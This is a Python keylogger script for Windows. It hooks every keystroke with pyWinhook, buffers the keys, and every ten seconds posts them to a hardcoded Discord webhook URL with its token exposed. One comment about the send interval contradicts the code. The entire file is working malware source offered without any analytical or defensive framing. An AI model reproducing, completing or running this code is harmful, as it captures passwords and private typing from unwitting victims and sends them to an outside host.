import pyWinhook
import pythoncom
from discord import SyncWebhook
from threading import Timer

# Discord webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1309349845961539584/kesC1XK2juRD5dQtNgFkbkR0tFzl42NbHJwrPMXo41OEpInVxAwiHpXHfYcTCSNoHnCA"

# Create the webhook object
webhook = SyncWebhook.from_url(WEBHOOK_URL)

# Key buffer
key_buffer = []

# Function to send the buffer to Discord
def send_buffer():
    global key_buffer
    if key_buffer:
        try:
            # Combine keys into a single message
            message = ''.join(key_buffer)
            webhook.send(f"Keys logged: {message}")
            print(f"Sent to Discord: {message}")  # Debugging
        except Exception as e:
            print(f"Error sending to Discord: {e}")
        finally:
            # Clear the buffer after sending
            key_buffer = []
    # Schedule the next buffer send
    Timer(10.0, send_buffer).start()  # Increased interval to 30 seconds

# Function to handle keyboard events
def OnKeyboardEvent(event):
    try:
        # Get the character or key
        key = chr(event.Ascii)
    except ValueError:
        # Handle special keys
        key = f"[{event.Key}]"

    # Add the key to the buffer
    key_buffer.append(key)
    return True

# Start the buffer sending loop
send_buffer()

# Set up the hook manager
hooks_manager = pyWinhook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

# Start monitoring keyboard events
try:
    pythoncom.PumpMessages()
except KeyboardInterrupt:
    print("Keylogger stopped.")
